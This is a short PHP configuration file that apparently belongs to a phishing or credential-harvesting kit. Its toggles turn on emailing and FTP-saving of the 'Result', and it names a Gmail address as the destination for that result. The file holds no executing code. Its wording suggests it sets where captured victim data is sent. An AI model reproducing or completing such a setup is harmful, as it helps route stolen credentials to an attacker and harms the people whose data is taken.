<?php


/*

 */




/*
Option Send Email :
1 : Send Email.
0 : Don't Send Email.
Option Ftp Write
1 : FTP Write.
0 : Don't FTP Save Result.
*/
$Send_Email = 1;
$Ftp_Write = 1;
//   <============================= Your Email =============================>
$to      = 'resulta.midelt@gmail.com';
//   <============================= Your Email =============================>



?>
